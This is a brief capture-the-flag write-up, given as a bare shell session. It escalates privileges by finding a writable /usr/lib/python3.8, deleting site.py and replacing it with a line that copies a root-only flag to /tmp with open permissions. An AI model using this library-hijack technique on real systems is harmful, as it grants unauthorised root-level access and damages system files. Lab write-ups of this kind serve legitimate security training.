## Write-up

```shell
$ find / -xdev -type f,d -writable 2> /dev/null
/usr/lib/python3.8
$ cd /usr/lib/python3.8
$ python3 -v /opt/hello.py
$ rm /usr/lib/python3.8/site.py
$ nano /usr/lib/python3.8/site.py
import os; os.system("cp /root/flag /tmp; chmod 777 /tmp/flag")
$ cat /tmp/flag
```
